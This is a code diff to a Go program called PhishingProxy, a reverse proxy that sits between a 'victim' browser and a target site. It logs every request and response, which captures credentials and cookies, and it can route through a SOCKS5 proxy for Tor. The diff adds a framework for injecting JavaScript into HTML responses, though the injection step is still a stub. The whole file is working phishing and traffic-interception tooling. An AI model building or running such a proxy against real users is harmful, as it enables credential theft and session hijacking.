@@ -9,6 +9,7 @@ import (
 	"net/http/httputil"
 	_ "net/http/pprof"
 	"net/url"
+	"strings"
 	"time"
 
 	"golang.org/x/net/proxy"
@@ -26,10 +27,36 @@ var (
 	proxyAddress   = flag.String("proxy", "", "Optional upstream SOCKS5 proxy. Useful for torification.")
 )
 
+// HTTPTransaction represents a complete request - response flow.
+type HTTPTransaction struct {
+	Request  *http.Request
+	Response *http.Response
+}
+
+// ResponseTransformer modifies a response in any way we see fit, such as inserting extra JavaScript.
+type ResponseTransformer interface {
+	Transform(response *http.Response) error
+}
+
+// JavaScriptInjectionTransformer holds JavaScript filename for injecting into response.
+type JavaScriptInjectionTransformer struct {
+	javascriptFileName string
+}
+
+// Transform Injects JavaScript into an HTML response.
+func (j JavaScriptInjectionTransformer) Transform(response *http.Response) error {
+	if !strings.Contains(response.Header.Get("Content-Type"), "text/html") {
+		return nil
+	}
+
+	return nil
+}
+
 // PhishingProxy proxies requests between the victim and the target, queuing requests for further processing.
 type PhishingProxy struct {
-	client    *http.Client
-	targetURL *url.URL
+	client               *http.Client
+	targetURL            *url.URL
+	responseTransformers []ResponseTransformer
 }
 
 func (p *PhishingProxy) rewriteHeaders(request *http.Request) {
@@ -41,7 +68,7 @@ func (p *PhishingProxy) rewriteHeaders(request *http.Request) {
 
 // HandleConnection does the actual work of proxying the HTTP request between the victim and the target.
 // Accepts the TCP connection from the victim's browser and a channel to send http Requests on to the processing worker thread.
-func (p *PhishingProxy) HandleConnection(conn net.Conn, requests chan<- *http.Request) {
+func (p *PhishingProxy) HandleConnection(conn net.Conn, transactions chan<- *HTTPTransaction) {
 	defer conn.Close()
 	reader := bufio.NewReader(conn)
 	request, err := http.ReadRequest(reader)
@@ -58,6 +85,10 @@ func (p *PhishingProxy) HandleConnection(conn net.Conn, requests chan<- *http.Re
 	}
 
 	log.Println(request.Method, request.URL, "-", resp.Status)
+	for _, transformer := range p.responseTransformers {
+		transformer.Transform(resp)
+	}
+
 	modifiedResponse, err := httputil.DumpResponse(resp, true)
 	if err != nil {
 		log.Println("Error converting requests to bytes:", err.Error())
@@ -69,17 +100,27 @@ func (p *PhishingProxy) HandleConnection(conn net.Conn, requests chan<- *http.Re
 		log.Println("Error responding to victim:", err.Error())
 		return
 	}
-	requests <- request
+	transactions <- &HTTPTransaction{
+		Request:  request,
+		Response: resp,
+	}
 }
 
-func processRequests(requests <-chan *http.Request) {
-	for request := range requests {
-		r, err := httputil.DumpRequest(request, true)
+func processTransactions(transactions <-chan *HTTPTransaction) {
+	for transaction := range transactions {
+		req, err := httputil.DumpRequest(transaction.Request, true)
 		if err != nil {
 			log.Println("Error dumping request to console.")
 			return
 		}
-		log.Println(string(r))
+		log.Println(string(req))
+
+		resp, err := httputil.DumpResponse(transaction.Response, false)
+		if err != nil {
+			log.Println("Error dumping response to console.")
+			return
+		}
+		log.Println(string(resp))
 	}
 }
 
@@ -111,9 +152,14 @@ func main() {
 		client.Transport = httpTransport
 	}
 
+	responseTransformers := []ResponseTransformer{
+		JavaScriptInjectionTransformer{javascriptFileName: "script.js"},
+	}
+
 	phishingProxy := &PhishingProxy{
-		client:    client,
-		targetURL: u,
+		client:               client,
+		targetURL:            u,
+		responseTransformers: responseTransformers,
 	}
 
 	if *attachProfiler {
@@ -123,13 +169,13 @@ func main() {
 		}()
 	}
 
-	requests := make(chan *http.Request)
-	go processRequests(requests)
+	transactions := make(chan *HTTPTransaction)
+	go processTransactions(transactions)
 	for {
 		conn, err := server.Accept()
 		if err != nil {
 			log.Println("Error when accepting request,", err.Error())
 		}
-		go phishingProxy.HandleConnection(conn, requests)
+		go phishingProxy.HandleConnection(conn, transactions)
 	}
 }
